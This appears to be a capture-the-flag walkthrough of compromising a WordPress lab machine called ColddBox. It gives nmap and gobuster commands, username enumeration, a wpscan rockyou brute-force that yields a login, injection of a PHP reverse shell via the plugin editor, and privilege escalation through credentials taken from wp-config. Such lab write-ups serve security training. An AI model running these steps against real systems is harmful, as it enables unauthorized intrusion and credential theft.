nmap -p- -T5 10.10.121.78 -v

PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown
MAC Address: 02:CF:09:09:B5:1F (Unknown)

nmap 80 -A -T4 10.10.121.78

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
MAC Address: 02:CF:09:09:B5:1F (Unknown)
Device type: general purpose
Running: Linux 3.X


no robots.txt on the server

directory enumeration:
**gobuster dir -u http://10.10.121.78 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt**

/wp-content           (Status: 301) [Size: 317] [--> http://10.10.121.78/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.121.78/wp-includes/]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.121.78/wp-admin/]
/hidden               (Status: 301) [Size: 313] [--> http://10.10.121.78/hidden/]
/server-status        (Status: 403) [Size: 277]
Progress: 220557 / 220558 (100.00%)

hidden has some weird usernames on it that we might be able to bust with brute forcing later on
![namesToTry](https://github.com/user-attachments/assets/80f04774-125b-4807-a106-8c9240122a42)


/wp-admin 
oh, great, it's a login page that we can poke at
![needBurpsuite23r](https://github.com/user-attachments/assets/3c79021c-eb8e-466f-9440-cda3a4b34044)
tried a burp suite cluster bomb with rockyou.txt against Hugo, Philip, and C0ldd... might need a different approach since it came up a dud
![wefqegwerg](https://github.com/user-attachments/assets/a44f7b3d-d75d-4956-8bae-a66292d6b660)


well, manually testing shows the lower case versions leak data on existing as users...
![nameExists](https://github.com/user-attachments/assets/5cbfd4db-b80d-45cd-a21c-4ed2b29dcf1a)

contrast from a non user saying user doesn't exist
![contrastInvaidUsernameBob](https://github.com/user-attachments/assets/79d5a5c0-a9a2-4ad1-bf6d-9087e597904e)
wpscan can also confirm the users hugo, philip, c0ldd exist; my cluster bomb was capitalized...
wpscan syntax :
*wpscan --url http://10.10.50.14 -e vp,vt,u,m -U hugo,philip,c0ldd*
![wpscanconfirmsTheseGuysExist](https://github.com/user-attachments/assets/c07bd026-60d0-4c24-b425-d7c3a68d0bac)
nano targets
insert name of targets
wpscan --url 10.10.50.14 -U targets --password-attack wp-login -P /usr/share/wordlists/rockyou.txt
![hebwf](https://github.com/user-attachments/assets/c66ab84a-d357-42c1-8a3e-47929c483a0e)

sorry for small screencap, we get, from the wpscan results:
user:c0ldd
pass: 9876543210

we can login to wp-admin with these credentials
![getInWithFoundCredentials](https://github.com/user-attachments/assets/91d9e653-0125-4410-b3ba-611b09073500)

from plugins, we can edit some files, allowing for a method of code injection to the site
![pluginsEditor](https://github.com/user-attachments/assets/59c1d548-681f-4440-96f5-aa9d48876dc0)
hijack index.php since that's usually a basic page that gets called first thing.
Inject the pentest monkey reverse php shell on her

![penTestMonkey24324](https://github.com/user-attachments/assets/131c07e0-2a6c-44bb-93f1-87604f59c9d4)

get a better basic shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
find / -type f -perm -04000 -ls 2>/dev/null
(find suid bit on any programs)
![searchforSUIDBit](https://github.com/user-attachments/assets/63c2b1ee-72ec-4d49-a76a-43452d0dbe05)

The "find" escape did not work, among other attempts...
![findNotWorkForEscape](https://github.com/user-attachments/assets/36e5bd9d-3387-4d03-8a58-038cfc69f802)

find config file
/www/var/html
wp-config
(should be fairly standard for wordpress sites)
This pathing leaked critical info
![ifWebExploitLookForConfigFile](https://github.com/user-attachments/assets/b7127e65-95d8-4f92-b3cf-18764df13cc7)
then -->
![www_config](https://github.com/user-attachments/assets/28e0f522-311d-4483-adb2-0936e580e2f4)
then i can use the credentials

![switchuserToSU](https://github.com/user-attachments/assets/84388f39-0058-4912-b8fd-36f121a8d93d)
su allows us to escalate to superuser root

![gotRoot2](https://github.com/user-attachments/assets/42b95cb7-314b-476c-966c-e3731022cbcb)

